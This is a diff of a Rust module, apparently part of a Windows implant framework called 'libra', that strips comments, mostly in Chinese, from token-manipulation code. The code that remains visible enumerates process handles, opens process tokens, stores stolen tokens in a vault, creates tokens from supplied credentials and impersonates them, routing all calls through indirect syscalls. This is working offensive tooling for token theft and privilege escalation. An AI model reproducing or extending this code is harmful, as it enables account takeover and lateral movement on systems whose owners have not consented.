@@ -2,7 +2,6 @@
 //!
 //! ABI (shared with `libra-load`): `module_main(input, input_len, output, cap)`.
 //! All token operations go through `libra-syscalls` indirect syscalls.
-//! Windows-only：非 Windows 平台返回明确的不可用错误（libra_syscalls 的 nt_* 仅 Windows 存在）。
 
 #![allow(non_snake_case)]
 
@@ -10,8 +9,6 @@ use serde_json::Value;
 use std::sync::Mutex;
 
 use libra_syscalls::types::{ClientId, Handle, ObjectAttributes};
-
-// ── 常量 ───────────────────────────────────────────────────────────────
 
 const SYSTEM_HANDLE_INFORMATION: u32 = 16;
 const TOKEN_USER: u32 = 1;
@@ -30,10 +27,7 @@ const SECURITY_IMPERSONATION: u32 = 2;
 const LOGON32_LOGON_NEW_CREDENTIALS: u32 = 9;
 const LOGON32_PROVIDER_WINNT50: u32 = 3;
 
-/// `NtCurrentThread()` / `NtCurrentProcess()` 伪句柄。
 const CURRENT_THREAD: Handle = usize::MAX - 1;
-
-// ── advapi32 FFI（Windows 专用）────────────────────────────────────────
 
 #[cfg(target_os = "windows")]
 #[link(name = "advapi32")]
@@ -55,8 +49,6 @@ extern "system" {
     fn LocalFree(mem: *mut core::ffi::c_void) -> usize;
 }
 
-// ── 结构 ───────────────────────────────────────────────────────────────
-
 #[repr(C)]
 struct SystemHandleEntry {
     unique_process_id: u16,
@@ -76,7 +68,6 @@ struct SecurityQos {
     effective_only: u8,
 }
 
-/// 偷到的 token 的 vault 条目。
 #[allow(dead_code)]
 struct VaultToken {
     id: u32,
@@ -120,7 +111,6 @@ pub unsafe extern "system" fn module_main(
 fn dispatch(input: &str) -> String {
     #[cfg(not(target_os = "windows"))]
     {
-        // libra_syscalls 的 nt_* 仅 Windows 存在，非 Windows 直接返回不可用。
         return r#"{"success":false,"error":"token module is windows-only"}"#.to_string();
     }
     #[cfg(target_os = "windows")]
@@ -151,18 +141,14 @@ fn dispatch(input: &str) -> String {
     }
 }
 
-// ── 辅助（Windows 专用实现；非 Windows 走 lib.rs 顶部的平台分支）──────
-
 #[cfg(target_os = "windows")]
 fn wide(s: &str) -> Vec<u16> {
     s.encode_utf16().chain(std::iter::once(0)).collect()
 }
 
-/// 枚举系统句柄表里的所有唯一 PID。
 #[cfg(target_os = "windows")]
 fn enum_pids() -> Vec<u32> {
     unsafe {
-        // 句柄表大小不定，按 ReturnLength 动态扩容重试。
         let mut size = 4 * 1024 * 1024usize;
         let buf = loop {
             let mut buf = vec![0u8; size];
@@ -184,7 +170,6 @@ fn enum_pids() -> Vec<u32> {
         };
 
         let count = u32::from_le_bytes([buf[0], buf[1], buf[2], buf[3]]) as usize;
-        // x64: NumberOfHandles(u32) 后对齐到 8，entries 从 offset 8 开始。
         let entries = buf.as_ptr().add(8) as *const SystemHandleEntry;
         let mut pids = Vec::new();
         for i in 0..count {
@@ -198,7 +183,6 @@ fn enum_pids() -> Vec<u32> {
     }
 }
 
-/// 打开进程的主 token。
 #[cfg(target_os = "windows")]
 unsafe fn open_process_token(pid: u32) -> Option<Handle> {
     let client = ClientId::for_process(pid);
@@ -224,10 +208,8 @@ unsafe fn open_process_token(pid: u32) -> Option<Handle> {
     Some(token)
 }
 
-/// 查询 token 所属用户，返回 `DOMAIN\user` 或 SID 字符串。
 #[cfg(target_os = "windows")]
 unsafe fn token_username(token: Handle) -> String {
-    // TOKEN_USER 结构：{ SID_AND_ATTRIBUTES { SID*, Attributes } }
     let mut buf = [0u8; 256];
     let mut ret = 0u32;
     let s = libra_syscalls::nt_query_information_token(
@@ -241,7 +223,6 @@ unsafe fn token_username(token: Handle) -> String {
         return "(unknown)".to_string();
     }
 
-    // buf[0..8] = SID 指针（小端）
     let sid_ptr = usize::from_le_bytes(buf[0..8].try_into().unwrap()) as *const u8;
     if sid_ptr.is_null() {
         return "(no sid)".to_string();
@@ -260,8 +241,6 @@ unsafe fn token_username(token: Handle) -> String {
 
     "(no sid)".to_string()
 }
-
-// ── op 实现（Windows 专用；非 Windows 由 dispatch 直接拒绝）────────────
 
 #[cfg(target_os = "windows")]
 fn list() -> String {
@@ -349,7 +328,6 @@ fn make(username: &str, domain: &str, password: &str) -> String {
 
 #[cfg(target_os = "windows")]
 fn impersonate(id: u32, pid: u32) -> String {
-    // 优先按 id 从 vault 选；否则按 pid 现偷。
     let (handle, _username) = {
         let vault = VAULT.lock().unwrap();
         if let Some(t) = vault.iter().find(|t| id != 0 && t.id == id) {
@@ -370,10 +348,8 @@ fn impersonate(id: u32, pid: u32) -> String {
     serde_json::json!({ "success": ok, "username": _username }).to_string()
 }
 
-/// 模拟一个 token 到当前线程（ReactOS SysImpersonateLoggedOnUser 的简化移植）。
 #[cfg(target_os = "windows")]
 unsafe fn impersonate_token(token: Handle) -> bool {
-    // 判断 token 类型
     let mut ty = 0u32;
     let mut ret = 0u32;
     let s = libra_syscalls::nt_query_information_token(
